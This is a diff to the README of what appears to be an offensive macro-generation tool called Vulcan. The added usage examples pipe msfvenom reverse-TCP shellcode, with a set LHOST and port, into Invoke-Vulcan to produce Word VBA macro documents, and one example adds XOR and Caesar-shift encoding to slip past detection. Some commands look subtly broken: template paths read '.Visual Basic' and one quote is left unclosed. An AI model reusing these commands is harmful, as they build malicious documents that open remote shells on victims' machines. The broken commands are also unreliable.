@@ -38,14 +38,34 @@ The community is greatly encourage toward building and improving upon the existi
 3. Run `vulcan`:
 
     ```powershell
-    Invoke-Vulcan -Payload "meterpreter/reverse_https" -PayloadOptions "LHOST=192.168.0.24 LPORT=443 EXITFUNC=thread" -Template "./assets/templates/indirect.vba"
+    wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | 
+            Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.Visual Basic"
     ```
 
-> Although obvious, `$BadAssMacros`, `$Payload` and `$PayloadOptions` are placeholders for your own values... 🙄
+> Although obvious, `windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread` is a placeholder for your own values... 🙄
 
 ## Usage
 
-`Get-Help -Name Invoke-Vulcan` is your friend... Even better if you use `Get-Help -Name Invoke-Vulcan -Detailed`.
+`Get-Help -Name Invoke-Vulcan` is your friend... Even better if you use `Get-Help -Name Invoke-Vulcan -Detailed`. Having said that, `Invoke-Vulcan` needs to be fed with a `hex`-formatted shellcode. This can be achieved with:
+
+```powershell
+    Get-Content $ShellCode -AsByteStream -Raw | Invoke-Vulcan ...
+```
+
+```powershell
+    wsl --exec msfvenom ... -f hex | Invoke-Vulcan ...
+```
+
+### Examples
+
+- `XOR`-encoded shellcode:
+
+    ```powershell
+    wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | 
+            Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.Visual Basic" -Decoder xor -DecoderPath ".\assets\decoders\xor.Visual Basic -CaesarShift 5
+    ```
+
+> Although obvious, `windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread` is a placeholder for your own values... 🙄
 
 ## Sponsor 💓
 
